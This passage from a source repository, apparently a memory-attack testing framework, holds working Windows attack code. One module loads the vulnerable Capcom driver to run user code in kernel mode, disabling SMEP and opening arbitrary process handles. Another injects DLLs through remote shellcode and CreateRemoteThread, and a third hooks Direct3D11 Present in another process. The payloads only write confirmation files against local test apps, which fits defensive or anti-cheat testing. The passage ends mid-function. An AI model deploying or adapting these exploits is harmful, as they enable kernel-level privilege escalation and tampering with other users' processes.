#pragma code_seg(".LTEXT$2")
#pragma code_seg(".LTEXT$3")
#pragma code_seg()

__declspec(allocate(".LDATA$1")) static char nonPagedDataStart = 0x0;
__declspec(allocate(".LDATA$3")) static char nonPagedDataEnd = 0x0;

__declspec(allocate(".LTEXT$1")) static char nonPagedTextStart = 0x0;
__declspec(allocate(".LTEXT$3")) static char nonPagedTextEnd = 0x0;

#define NtCurrentProcess()(HANDLE(-1))


#define NON_PAGED_DATA  __declspec(allocate(".LDATA$2"))
#define NON_PAGED_CODE __declspec(code_seg(".LTEXT$2")) __declspec(noinline)
#define NON_PAGED_LAMBDA(...) [](__VA_ARGS__) NON_PAGED_CODE

// Mini non-paged crt
#define NonPagedMemcpy(dst, src, size) __movsb((BYTE*) dst, (const BYTE*) src, size)
#define NonPagedMemset(dst, val, size) __stosb((BYTE*) dst, val, size)
#define NonPagedZeroMemory(dst, size) __stosb((BYTE*) dst, 0, size)

#pragma comment(linker,"/MERGE:.LDATA=.data")
#pragma comment(linker,"/MERGE:.LTEXT=.text")

// Routines to lock the pages
static BOOL TryIncreaseWorkingSetSize(SIZE_T Size) {
	SIZE_T Min, Max;
	if (!GetProcessWorkingSetSize(NtCurrentProcess(), &Min, &Max))
		return FALSE;
	if (!SetProcessWorkingSetSize(NtCurrentProcess(), Min + Size, Max + Size))
		return FALSE;
	// printf("[+] Increasing working set (%d KB, %d KB) -> (%d KB, %d KB)!\n", Min / 1024, Max / 1024, (Min + Size) / 1024, (Max + Size) / 1024);
	return TRUE;
}

static BOOL TryLockPage(PVOID Page) {
	if (!TryIncreaseWorkingSetSize(0x1000))
		return FALSE;
	if (VirtualLock(Page, 0x1000))
		return TRUE;
	if (!TryIncreaseWorkingSetSize(0x2000))
		return FALSE;
	return VirtualLock(Page, 0x1000);
}

static BOOL LockRange(PVOID From, PVOID To) {
	PBYTE FromPageAligned = (PBYTE) ((uintptr_t) (From) & (~0xFFF));
	PBYTE ToPageAligned = (PBYTE) ((uintptr_t) (To) & (~0xFFF));

	for (PBYTE Current = FromPageAligned; Current <= ToPageAligned; Current += 0x1000) {
		if (!TryLockPage(Current)) {
			// printf("[+] Failed locking %16llx!\n", Current);
			return FALSE;
		}
		else {
			// printf("[+] Locked %16llx successfully!\n", From);
		}
	}
	return TRUE;
}

static BOOL LockMemorySections() {
	// printf("[+] .LDATA: %16llx -> %16llx!\n", &nonPagedDataStart, &nonPagedDataEnd);
	// printf("[+] .LTEXT: %16llx -> %16llx!\n", &nonPagedTextStart, &nonPagedTextEnd);

	return LockRange(&nonPagedDataStart, &nonPagedDataEnd) && LockRange(&nonPagedTextStart, &nonPagedTextEnd);
}
```

`AttackServices/CapcomDriverAttack/CapcomWrapper.h`:

```h
#pragma once
#include <windows.h>
#include <iostream>
#include <intrin.h>
#include "CapcomLoader.h"
#include "CapcomLockMemory.h"
#include "CapcomDriver.h"
#include "../../Core/MemWarsServicesCore.h"

using namespace std;

/********* BASIC WRAPPER *********/

#define IOCTL_RunPayload64  0xAA013044
#define PAYLOAD_BUFFER_SIZE 0x200

typedef PVOID(NTAPI* MmGetSystemRoutineAddress_t)(PUNICODE_STRING);
typedef VOID(NTAPI* UserFunc)(MmGetSystemRoutineAddress_t, PVOID userData);
static HANDLE device;

struct CapcomCodePayload {
    BYTE* pointerToPayload;
    BYTE  payload[PAYLOAD_BUFFER_SIZE];
};

void initIntSmepTrampoline();
BOOL InitDriver() {

    if (!LockMemorySections()) {
        cout << "InitDriver::LockMemorySections failed!" << endl;
        return FALSE;
    }

    if (!LoadDriver()) {
        cout << "InitDriver::Loading driver failed!" << endl;
        return FALSE;
    }

    device = OpenDevice("Htsysm72FB");
    if (!device) {
        cout << "InitDriver::Could not retrieve device!" << endl;
        return FALSE;
    }

    initIntSmepTrampoline();
    return TRUE;
}

BOOL UnloadCapcomDriver() {
    DecryptDriver();
    CloseHandle(device);
    if (UnloadDriver(globalCapcomDriverName.c_str())) {
        return FALSE;
    }
    if (RemoveSimilarDrivers(CAPCOM_DRIVER)) {
        return FALSE;
    }
    return TRUE;
}

void RunInKernel(UserFunc func, PVOID userData) {

    CapcomCodePayload* codePayload = (CapcomCodePayload*)VirtualAlloc(nullptr, sizeof(CapcomCodePayload), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    BYTE codePayloadBuf[] = {
        0xE8, 0x08, 0x00, 0x00, 0x00,                               // CALL $+8 ; Skip 8 bytes, this puts the UserFunction into RAX
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,             // UserFunction address will be here
        0x48, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // MOV RDX, userData
        0x58,                                                       // POP RAX
        0xFF, 0x20                                                  // JMP [RAX]
    };

    *(ULONGLONG*)(codePayloadBuf + 5) = (ULONGLONG)func;
    *(ULONGLONG*)(codePayloadBuf + 15) = (ULONGLONG)userData;

    // BYTE codePayloadBuf[] = {
    //     0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     // mov rax, data
    //     0x48, 0x89, 0xC1,                                               // mov rcx, rax
    //     0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     // mov rax, destination
    //     0xFF, 0xE0                                                      // jmp rax
    // };

    // *(ULONGLONG*)(codePayloadBuf + 2) = (ULONGLONG)userData;
    // *(ULONGLONG*)(codePayloadBuf + 15) = (ULONGLONG)func;

    codePayload->pointerToPayload = codePayload->payload;

    ZeroMemory(codePayload->payload, PAYLOAD_BUFFER_SIZE);
    CopyMemory(codePayload->payload, codePayloadBuf, sizeof(codePayloadBuf));

    DWORD status = 0x0;
    DWORD bytesReturned = 0x0;
    DeviceIoControl(device, IOCTL_RunPayload64, &codePayload->pointerToPayload, sizeof(ULONG_PTR), &status, sizeof(status), &bytesReturned, 0);
    // VirtualFree(codePayload, sizeof(CapcomCodePayload), MEM_RELEASE); // do not do this, it causes random bluescreens
}

/********* CALLS WITH ENABLED INTERRUPTS AND SMEP *********/
using kernelTrampolineCall = uint64_t(*)(...);
using kernelFuncCall = uint64_t(__fastcall*)(...);

NON_PAGED_DATA static kernelFuncCall ExAllocatePoolPtr = 0;
NON_PAGED_DATA static kernelTrampolineCall TrampolineFuncPtr = 0;

static const uint32_t intAndSmepHandlingTrampolineStoreOffset = 0x34;
static const uint32_t intAndSmepHandlingTrampolineEnabledOffset = 0xB;
NON_PAGED_DATA static UCHAR intAndSmepHandlingTrampoline[] = {
	0x0F, 0x20, 0xE0,                                // mov    rax,cr4               ; -
	0x48, 0x0F, 0xBA, 0xE8, 0x14,                    // bts    rax,0x14              ; will be nop'd if no SMEP support
	0x0F, 0x22, 0xE0,                                // mov    cr4,rax               ; -
	0xFB,                                            // sti
	0x48, 0x8D, 0x05, 0x07, 0x00, 0x00, 0x00,        // lea    rax,[rip+0x7]         ; continue
	0x8F, 0x40, 0x12,                                // pop    QWORD PTR [rax+0x12]  ; ret_store
	0x50,                                            // push rax
	0xFF, 0x60, 0x1A,                                // jmp    QWORD PTR [rax+0x1a]  ; call_store
	0xFA,                                            // cli
	0x0F, 0x20, 0xE1,                                // mov    rcx,cr4
	0x48, 0x0F, 0xBA, 0xF1, 0x14,                    // btr    rcx,0x14
	0x0F, 0x22, 0xE1,                                // mov    cr4,rcx
	0xFF, 0x25, 0x00, 0x00, 0x00, 0x00,              // jmp    QWORD PTR [rip+0x0]   ; ret_store

	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // ret_store:  dq 0
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // call_store: dq 0
};

template<typename ...Params>
NON_PAGED_CODE static uint64_t CallWithInterruptsAndSmep(PVOID ptr, Params &&... params) {
	*(PVOID*)(((PUCHAR)TrampolineFuncPtr) + intAndSmepHandlingTrampolineStoreOffset) = ptr;
	return TrampolineFuncPtr(std::forward<Params>(params)...);
}

NON_PAGED_CODE void __stdcall CreateIntSmepTrampoline(MmGetSystemRoutineAddress_t pMmGetSystemRoutineAddress, PVOID userData) {
    PVOID out = (PVOID)ExAllocatePoolPtr(0ull, sizeof(intAndSmepHandlingTrampoline));
	NonPagedMemcpy(out, intAndSmepHandlingTrampoline, sizeof(intAndSmepHandlingTrampoline));
	TrampolineFuncPtr = (kernelTrampolineCall)out;
}

void initIntSmepTrampoline() {
    if (TrampolineFuncPtr) {
        return;
    }

	int cpuInfo[4];
	__cpuid(cpuInfo, 0x7);
	
	if (!(cpuInfo[1] & (1 << 7))) { // EBX : 1 << 7 = SMEP
		// No SMEP support!
		NonPagedMemset(intAndSmepHandlingTrampoline, 0x90, intAndSmepHandlingTrampolineEnabledOffset);
	}
    ExAllocatePoolPtr = GetKernelProcAddress<>("ExAllocatePool");
	RunInKernel(CreateIntSmepTrampoline, NULL);
}







```

`AttackServices/CapcomDriverAttack/NtDefines.h`:

```h
#pragma once
#include <Windows.h>

#define SeLoadDriverPrivilege 10ull
#define SystemModuleInformation 0xBull
#define AdjustCurrentProcess 0ull

using fnFreeCall = uint64_t(__fastcall*)(...);
template<typename ...Params>
static NTSTATUS __NtRoutine(const char* Name, Params &&... params) {
	auto fn = (fnFreeCall) GetProcAddress(GetModuleHandleA("ntdll.dll"), Name);
	return fn(std::forward<Params>(params)...);
}

#define RtlAdjustPrivilege(...) __NtRoutine("RtlAdjustPrivilege", __VA_ARGS__)
#define NtLoadDriver(...) __NtRoutine("NtLoadDriver", __VA_ARGS__)
#define NtUnloadDriver(...) __NtRoutine("NtUnloadDriver", __VA_ARGS__)
```

`AttackServices/CapcomDriverAttack/OpenProcessAttack.cpp`:

```cpp

#include <Windows.h>
#include <winternl.h>
#include <iostream>
#include "CapcomWrapper.h"
#include "OpenProcessAttack.h"

using namespace std;
 
 
BOOLEAN g_InitializationFinished = FALSE;
 
void GetSystemRoutines(MmGetSystemRoutineAddress_t pMmGetSystemRoutineAddress) {

    PsLookupProcessByProcessId = (decltype(PsLookupProcessByProcessId))GetKernelRoutine(pMmGetSystemRoutineAddress, L"PsLookupProcessByProcessId");
    ObDereferenceObject = (decltype(ObDereferenceObject))GetKernelRoutine(pMmGetSystemRoutineAddress, L"ObDereferenceObject");
    PsProcessType = (decltype(PsProcessType))GetKernelRoutine(pMmGetSystemRoutineAddress, L"PsProcessType");
    ObOpenObjectByPointer = (decltype(ObOpenObjectByPointer))GetKernelRoutine(pMmGetSystemRoutineAddress, L"ObOpenObjectByPointer");
 
    g_InitializationFinished = TRUE;
}
 
void __stdcall CapcomOpenProcess(MmGetSystemRoutineAddress_t pMmGetSystemRoutineAddress, PVOID CustomData) {
    NTSTATUS status = 0;
    PEPROCESS process = NULL;
    HANDLE handle = NULL;
    OPENPROCESS_DATA* data = (OPENPROCESS_DATA*)CustomData;
 
    if(!g_InitializationFinished) {
        GetSystemRoutines(pMmGetSystemRoutineAddress);
    }
 
    __try {
        if(data->processId != NULL) {
            status = PsLookupProcessByProcessId(data->processId, &process);
        }
        if(status >= 0) {
            status = ObOpenObjectByPointer(
                process, 
                0, 
                NULL, 
                data->access,
                *PsProcessType,
                0/*KernelMode*/,
                &handle);
            if(status >= 0) {
                data->returnedHandle = handle;
            }
        }
    } __except(EXCEPTION_EXECUTE_HANDLER) {
 
    }
    if (process != NULL) {
        ObDereferenceObject(process);
    }
}



HANDLE OpenProcessFromKernel(HANDLE processId, ACCESS_MASK access) {

    if (!InitDriver()) {
        return NULL;
    }

    OPENPROCESS_DATA data;
    data.processId = processId;
    data.access = access;
    data.returnedHandle = NULL;

    RunInKernel(CapcomOpenProcess, &data);

    return data.returnedHandle;
}

```

`AttackServices/CapcomDriverAttack/OpenProcessAttack.h`:

```h
#pragma once
#include <Windows.h>
#include <winternl.h>

typedef struct  _EPROCESS *PEPROCESS;
typedef struct  _ACCESS_STATE *PACCESS_STATE;
typedef struct  _OBJECT_TYPE *POBJECT_TYPE;
typedef CCHAR   KPROCESSOR_MODE;

static POBJECT_TYPE* PsProcessType;
static NTSTATUS (NTAPI* PsLookupProcessByProcessId)(HANDLE, PEPROCESS*);
static VOID (NTAPI* ObDereferenceObject)(PVOID);
static NTSTATUS (NTAPI* ObOpenObjectByPointer)(PVOID,ULONG,PACCESS_STATE,ACCESS_MASK,POBJECT_TYPE,KPROCESSOR_MODE,PHANDLE);

struct OPENPROCESS_DATA {
    HANDLE processId;
    ACCESS_MASK access;
    HANDLE returnedHandle;
};

HANDLE OpenProcessFromKernel(HANDLE processId, ACCESS_MASK access);
```

`AttackServices/CapcomDriverAttack/README.md`:

```md
# Capcom Driver Attack

This attack installs the vulnerable Capcom driver.

After the driver is installed, user mode functions can be executed in kernel mode. In this case, any process is opened from kernel mode and the corresponding HANDLE is returned.

```

`AttackServices/CapcomDriverAttack/buildCapcomAttackTest.bat`:

```bat
@ECHO OFF
cl.exe /EHsc CapcomAttackTest.cpp OpenProcessAttack.cpp ../../Core/MemWarsServicesCore.cpp ../../Core/MemWarsCore.c /link user32.lib ntdll.lib Advapi32.lib Shlwapi.lib
```

`AttackServices/DLLInjectionAttack/InjectedDLL.cpp`:

```cpp
#include <windows.h>


DWORD WINAPI StartWork(LPVOID lpParam) {
    // MessageBoxA(NULL, "DLL Attached!\n", "MemWars Framework", MB_OK | MB_TOPMOST);
	TCHAR tempPath[MAX_PATH];
    GetTempPath(MAX_PATH, tempPath);
    lstrcatA(tempPath, "dllInjectionConfirmationFile");
    HANDLE h = CreateFileA(tempPath, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	CloseHandle(h);
	FreeLibraryAndExitThread((HMODULE)lpParam, 0);
    return 1;
}


BOOL APIENTRY DllMain(HMODULE hinstDLL, DWORD  fdwReason, LPVOID lpReserved) {
	switch (fdwReason) {
		case DLL_PROCESS_ATTACH:
			CreateThread(NULL, 0, &StartWork, hinstDLL, 0, NULL);
			break;
		case DLL_THREAD_ATTACH:
        	break;
	}
	return TRUE;
}
```

`AttackServices/DLLInjectionAttack/Injector.cpp`:

```cpp
#include <windows.h>
#include <iostream>
#include "Injector.h"

using namespace std;

int LoadDll(HANDLE hProcess, const WCHAR* dllName) {
	int namelen = wcslen(dllName) + 1;
    LPVOID remoteMemory = VirtualAllocEx(hProcess, NULL, 4096, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (remoteMemory == NULL) {
        return 1;
    }

    HMODULE k32 = GetModuleHandleA("kernel32.dll");
    if (k32 == NULL) {
        return 3;
    }

    FARPROC addrLoadLibraryW = GetProcAddress(k32, "LoadLibraryW");
    FARPROC addrExitThread = GetProcAddress(k32, "ExitThread");
    if (addrLoadLibraryW == NULL || addrExitThread == NULL) {
        return 4;
    }

    void* rwMemory = VirtualAlloc(NULL, 4096, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (rwMemory == NULL) {
        cout << "VirtualAlloc returned NULL. Memory full? Error code: " << GetLastError() <<endl;
        return 1;
    }

    BYTE loadLibraryCodeCave[] = {
        0x48, 0x83, 0xE4, 0xF0,				        // +0 and rsp, 0x0f (make sure stack 16-byte aligned)
        0x48, 0xB9, 0, 0, 0, 0, 0, 0, 0, 0,         // mov rcx (DLL name)
        0x48, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0,         // mov rax (LoadLibraryW Process Address)
        0x48, 0x83, 0xEC, 0x20,				        // sub rsp 0x20
		0xFF, 0xD0,							        // call rax
		0x48, 0x83, 0xC4, 0x20,				        // add rsp, 0x20
        0x48, 0x31, 0xC9,                           // xor rcx, rcx (Set Parameter for ExitThread to 0)
        0x48, 0x83, 0xF8, 0x00,                     // cmp rax, 0x00 (Check if LoadLibrary return NULL)
        0x74, 0x07,                                 // je rel + 7 (Skip next instruction if LoadLibrary returned NULL)
        0x48, 0xC7, 0xC1, 0x01, 0x00, 0x00, 0x00,   // mov rcx, 0x1 (Set Parameter for ExitThread to 1)
        0x48, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0,         // mov rax (ExitThread Process Address)
        0x48, 0x83, 0xEC, 0x20,				        // sub rsp 0x20
		0xFF, 0xD0,							        // call rax
    };
    

    size_t shellCodeSize = sizeof(loadLibraryCodeCave);

    *(DWORD64*)((PUCHAR)loadLibraryCodeCave + 6) = (DWORD64)(ULONG_PTR)remoteMemory + shellCodeSize;
	*(DWORD64*)((PUCHAR)loadLibraryCodeCave + 16) = (DWORD64)(ULONG_PTR)addrLoadLibraryW;
    *(DWORD64*)((PUCHAR)loadLibraryCodeCave + 52) = (DWORD64)(ULONG_PTR)addrExitThread;
    

    CopyMemory(rwMemory, loadLibraryCodeCave, sizeof(loadLibraryCodeCave));
    CopyMemory((void*)((DWORD64)rwMemory + shellCodeSize), dllName, namelen * sizeof(WCHAR));

    SIZE_T ret = WriteProcessMemory(hProcess, remoteMemory, rwMemory, 4096, NULL);
    if (ret == 0) {
        return 2;
    }


    HANDLE thread = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)remoteMemory, NULL, 0, NULL);
    if (thread == NULL) {
        return 5;
    }
	
    DWORD status = WaitForSingleObject(thread, INFINITE);
    if (status == WAIT_FAILED) {
        return 6;
    }

    DWORD threadStatus;
    if (GetExitCodeThread(thread, &threadStatus)) {
        // cout << threadStatus << endl;
        if (threadStatus == 1) {
            return 0;
        } else {
            return LoadDllNoShellcode(hProcess, dllName);
        }
    } else {
        return 8;
    }
}


```

`AttackServices/DLLInjectionAttack/Injector.h`:

```h
#pragma once
#include <windows.h>

int LoadDll(HANDLE hProcess, const WCHAR* dllPath);
int LoadDllNoShellcode(HANDLE hProcess, const WCHAR* dllPath);
```

`AttackServices/DLLInjectionAttack/InjectorNoShellcode.cpp`:

```cpp
#include <windows.h>
#include "Injector.h"

int LoadDllNoShellcode(HANDLE hProcess, const WCHAR* dllPath) {
	int namelen = wcslen(dllPath) + 1;
    LPVOID remoteMemory = VirtualAllocEx(hProcess, NULL, namelen * sizeof(WCHAR), MEM_COMMIT, PAGE_EXECUTE);
    if (remoteMemory == NULL) {
        return 1;
    }
    SIZE_T ret = WriteProcessMemory(hProcess, remoteMemory, dllPath, namelen * sizeof(WCHAR), NULL);
    if (ret == 0) {
        return 2;
    }

    HMODULE k32 = GetModuleHandleA("kernel32.dll");
    if (k32 == NULL) {
        return 3;
    }
    LPVOID funcAddr = GetProcAddress(k32, "LoadLibraryW");
    if (funcAddr == NULL) {
        return 4;
    }

    HANDLE thread = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)funcAddr, remoteMemory, NULL, NULL);
    if (thread == NULL) {
        return 5;
    }
	
    DWORD status = WaitForSingleObject(thread, INFINITE);
    if (status == WAIT_FAILED) {
        return 6;
    }
    CloseHandle(thread);
    
    return 10;
}


```

`AttackServices/DLLInjectionAttack/InjectorTest.cpp`:

```cpp
#include <iostream>
#include "../../Core/MemWarsCore.h"
#include "Injector.h"

using namespace std;

void LoadDllTest() {
    system("start /B memoryTestApp.exe");
    HANDLE hProcess = NULL;
    while (hProcess == NULL) {
        hProcess = (HANDLE)GetProcessByName("memoryTestApp.exe");
    }
    int ret = LoadDll(hProcess, L"InjectedDLLa.dll");
    if (ret == 0) {
        cout << "LoadDllTest() success" << endl;
    } else {
        cout << "LoadDllTest() failed " << ret << endl;
    }

    Exit:
    system("taskkill /IM memoryTestApp.exe /F >nul");
}

int main() {
    LoadDllTest();
}
```

`AttackServices/DLLInjectionAttack/README.md`:

```md
# Basic DLL Injection



This attack is a simple DLL injection that uses the function [VirtualAllocEx](https://msdn.microsoft.com/en-us/library/windows/desktop/aa366890%28v=vs.85%29.aspx?f=255&MSPPError=-2147217396) to reserve memory on an external process. 
Then [WriteProcessMemory](https://msdn.microsoft.com/de-de/library/windows/desktop/ms681674(v=vs.85).aspx) is used to write the DLL to the reserved memory. 

Finally, [CreateRemoteThread](https://msdn.microsoft.com/en-us/library/windows/desktop/ms682437(v=vs.85).aspx) starts a thread within the external process that executes the DLL.
```

`AttackServices/DLLInjectionAttack/buildDLL.bat`:

```bat
@ECHO OFF
cl.exe /LD InjectedDLL.cpp /link user32.lib
```

`AttackServices/DLLInjectionAttack/build_InjecterTest.bat`:

```bat
@ECHO OFF
cl.exe /EHsc InjectorTest.cpp Injector.cpp ../../Core/MemWarsCore.c /link User32.lib Kernel32.lib Advapi32.lib
```

`AttackServices/Direct3D11HookAttack/Direct3DHook.cpp`:

```cpp
#include <windows.h>
#include "Direct3DHook.h"
#include "../DLLInjectionAttack/Injector.h"

using namespace std;


BOOL LoadDirect3DDll(HANDLE hProcess, const WCHAR* dllPath) {
    return LoadDll(hProcess, dllPath);
}
```

`AttackServices/Direct3D11HookAttack/Direct3DHook.h`:

```h
#pragma once

#include <windows.h>

BOOL LoadDirect3DDll(HANDLE hProcess, const WCHAR* dllPath);
```

`AttackServices/Direct3D11HookAttack/Direct3DHookDLL.cpp`:

```cpp
#include <windows.h>
#pragma warning (disable : 4005)
#include <d3d11.h>
#include <d3dx11.h>
#include "../../libs/PolyHook/PolyHook.hpp"

using namespace std;

shared_ptr<PLH::Detour> DetourD3D11Present(new PLH::Detour);

DWORD_PTR* pSwapChainVtable = NULL;
DWORD_PTR* pContextVTable = NULL;
DWORD_PTR* pDeviceVTable = NULL;

ID3D11Device *pDevice = NULL;
ID3D11DeviceContext *pContext = NULL;

BOOL unhooked = FALSE;


typedef HRESULT(__stdcall *D3D11Present) (IDXGISwapChain* pSwapChain, UINT SyncInterval, UINT Flags);
D3D11Present pD3D11Present = NULL;

HRESULT __stdcall HookD3D11Present(IDXGISwapChain* pSwapChain, UINT SyncInterval, UINT Flags) {
    // CreateFileA("direct3DConfirmationFile", GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    TCHAR tempPath[MAX_PATH];
    GetTempPath(MAX_PATH, tempPath);
    lstrcatA(tempPath, "dllInjectionConfirmationFile");
    HANDLE h = CreateFileA(tempPath, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	CloseHandle(h);
    DetourD3D11Present->UnHook();
    unhooked = TRUE;
    return pD3D11Present(pSwapChain, SyncInterval, Flags);
}

LRESULT CALLBACK DXGIMsgProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam){ return DefWindowProc(hwnd, uMsg, wParam, lParam); }
DWORD WINAPI InitializeHook(LPVOID lpParam) {

    WNDCLASSEXA wc = {sizeof(WNDCLASSEX), CS_CLASSDC, DXGIMsgProc, 0L, 0L, GetModuleHandleA(NULL), NULL, NULL, NULL, NULL, "WX", NULL};
	RegisterClassExA(&wc);
    HWND hWnd = CreateWindowA("WX", NULL, WS_OVERLAPPEDWINDOW, 100, 100, 300, 300, NULL, NULL, wc.hInstance, NULL);

    D3D_FEATURE_LEVEL requestedLevels[] = {D3D_FEATURE_LEVEL_11_0, D3D_FEATURE_LEVEL_10_1};
    D3D_FEATURE_LEVEL obtainedLevel;

    IDXGISwapChain* pSwapChain;
    DXGI_SWAP_CHAIN_DESC scd;
	ZeroMemory(&scd, sizeof(scd));
	scd.BufferCount = 1;
	scd.BufferDesc.Format = DXGI_FORMAT_R8G8B8A8_UNORM;
	scd.BufferDesc.Scaling = DXGI_MODE_SCALING_UNSPECIFIED;
	scd.BufferDesc.ScanlineOrdering = DXGI_MODE_SCANLINE_ORDER_UNSPECIFIED;
	scd.BufferUsage = DXGI_USAGE_RENDER_TARGET_OUTPUT;

	scd.Flags = DXGI_SWAP_CHAIN_FLAG_ALLOW_MODE_SWITCH;
	scd.OutputWindow = hWnd;
	scd.SampleDesc.Count = 1;
	scd.SwapEffect = DXGI_SWAP_EFFECT_DISCARD;
	scd.Windowed = ((GetWindowLongPtr(hWnd, GWL_STYLE) & WS_POPUP) != 0) ? false : true;

	scd.BufferDesc.Width = 1;
	scd.BufferDesc.Height = 1;
	scd.BufferDesc.RefreshRate.Numerator = 0;
	scd.BufferDesc.RefreshRate.Denominator = 1;
    UINT createFlags = 0;
    // create device to retrieve pointer to VTable
    D3D11CreateDeviceAndSwapChain(
		nullptr,
		D3D_DRIVER_TYPE_HARDWARE,
		nullptr,
		createFlags,
		requestedLevels,
		sizeof(requestedLevels) / sizeof(D3D_FEATURE_LEVEL),
		D3D11_SDK_VERSION,
		&scd,
		&pSwapChain,
		&pDevice,
		&obtainedLevel,
        &pContext
    );

    pSwapChainVtable = (DWORD_PTR*)pSwapChain;
    pSwapChainVtable = (DWORD_PTR*)pSwapChainVtable[0];

    pContextVTable = (DWORD_PTR*)pContext;
    pContextVTable = (DWORD_PTR*)pContextVTable[0];

	pDeviceVTable = (DWORD_PTR*)pDevice;
    pDeviceVTable = (DWORD_PTR*)pDeviceVTable[0];
    
    DetourD3D11Present->SetupHook((PBYTE)pSwapChainVtable[8], (PBYTE)HookD3D11Present);
    DetourD3D11Present->Hook();
    pD3D11Present = DetourD3D11Present->GetOriginal<D3D11Present>();
    while (!unhooked) {
        Sleep(1000); // wait for D3D11Present to be called
    }
    Sleep(1000);
    FreeLibraryAndExitThread((HMODULE)lpParam, 0);

    return 1;
}


BOOL WINAPI DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpvReserved) {
    switch (dwReason) {
        case DLL_PROCESS_ATTACH:
            CreateThread(NULL, 0, &InitializeHook, hModule, 0, NULL); 
            break;
        }
    return TRUE;
}
```

`AttackServices/Direct3D11HookAttack/Direct3DHookTest.cpp`:

```cpp
#include <windows.h>
#include <iostream>
#include <Shlwapi.h>
#include "../../Core/MemWarsCore.h"
#include "Direct3DHook.h"

using namespace std;

void Direct3DHookTest() {
    system("start Direct3DTestApp.exe");
    HANDLE hProcess = NULL;
    while (hProcess == NULL) {
        hProcess = (HANDLE)GetProcessByName("Direct3DTestApp.exe");
    }
    
    if (!LoadDirect3DDll(hProcess, L"InjectedDLL.dll")) {
        cout << "LoadDllTest() failed" << endl;
    }

    Sleep(100);
    
    if (!PathFileExists("direct3DConfirmationFile")) {
        cout << "Direct3DHookTest() failed" << endl;
        goto Exit;
    } else {
        cout << "Direct3DHookTest() success" << endl;
        system("taskkill /IM Direct3DTestApp.exe /F >nul");
        DeleteFile("direct3DConfirmationFile");
        return;
    }

    Exit:
    system("taskkill /IM Direct3DTestApp.exe /F >nul");
}


int main() {
    Direct3DHookTest();
}
```

`AttackServices/Direct3D11HookAttack/Direct3DTestApp.cpp`:

```cpp
//--------------------------------------------------------------------------------------
// File: Tutorial01.cpp
//
// This application demonstrates creating a Direct3D 11 device
//
// Copyright (c) Microsoft Corporation. All rights reserved.
//--------------------------------------------------------------------------------------
#pragma warning (disable : 4005)
#include <windows.h>
#include <d3d11.h>
#include <d3dx11.h>
#include "resource.h"


//--------------------------------------------------------------------------------------
// Global Variables
//--------------------------------------------------------------------------------------
HINSTANCE               g_hInst = NULL;
HWND                    g_hWnd = NULL;
D3D_DRIVER_TYPE         g_driverType = D3D_DRIVER_TYPE_NULL;
D3D_FEATURE_LEVEL       g_featureLevel = D3D_FEATURE_LEVEL_11_0;
ID3D11Device*           g_pd3dDevice = NULL;
ID3D11DeviceContext*    g_pImmediateContext = NULL;
IDXGISwapChain*         g_pSwapChain = NULL;
ID3D11RenderTargetView* g_pRenderTargetView = NULL;


//--------------------------------------------------------------------------------------
// Forward declarations
//--------------------------------------------------------------------------------------
HRESULT InitWindow( HINSTANCE hInstance, int nCmdShow );
HRESULT InitDevice();
void CleanupDevice();
LRESULT CALLBACK    WndProc( HWND, UINT, WPARAM, LPARAM );
void Render();


//--------------------------------------------------------------------------------------
// Entry point to the program. Initializes everything and goes into a message processing 
// loop. Idle time is used to render the scene.
//--------------------------------------------------------------------------------------
int WINAPI wWinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nCmdShow )
{
    UNREFERENCED_PARAMETER( hPrevInstance );
    UNREFERENCED_PARAMETER( lpCmdLine );

    if( FAILED( InitWindow( hInstance, nCmdShow ) ) )
        return 0;

    if( FAILED( InitDevice() ) )
    {
        CleanupDevice();
        return 0;
    }

    // Main message loop
    MSG msg = {0};
    while( WM_QUIT != msg.message )
    {
        if( PeekMessage( &msg, NULL, 0, 0, PM_REMOVE ) )
        {
            TranslateMessage( &msg );
            DispatchMessage( &msg );
        }
        else
        {
            Render();
        }
    }

    CleanupDevice();

    return ( int )msg.wParam;
}


//--------------------------------------------------------------------------------------
// Register class and create window
//--------------------------------------------------------------------------------------
HRESULT InitWindow( HINSTANCE hInstance, int nCmdShow )
{
    // Register class
    WNDCLASSEX wcex;
    wcex.cbSize = sizeof( WNDCLASSEX );
    wcex.style = CS_HREDRAW | CS_VREDRAW;
    wcex.lpfnWndProc = WndProc;
    wcex.cbClsExtra = 0;
    wcex.cbWndExtra = 0;
    wcex.hInstance = hInstance;
    wcex.hIcon = LoadIcon( hInstance, ( LPCTSTR )IDI_TUTORIAL1 );
    wcex.hCursor = LoadCursor( NULL, IDC_ARROW );
    wcex.hbrBackground = ( HBRUSH )( COLOR_WINDOW + 1 );
    wcex.lpszMenuName = NULL;
    wcex.lpszClassName = "TutorialWindowClass";
    wcex.hIconSm = LoadIcon( wcex.hInstance, ( LPCTSTR )IDI_TUTORIAL1 );
    if( !RegisterClassEx( &wcex ) )
        return E_FAIL;

    // Create window
    g_hInst = hInstance;
    RECT rc = { 0, 0, 640, 480 };
    AdjustWindowRect( &rc, WS_OVERLAPPEDWINDOW, FALSE );
    g_hWnd = CreateWindow( "TutorialWindowClass", "Direct3D 11 Tutorial 1: Direct3D 11 Basics", WS_OVERLAPPEDWINDOW,
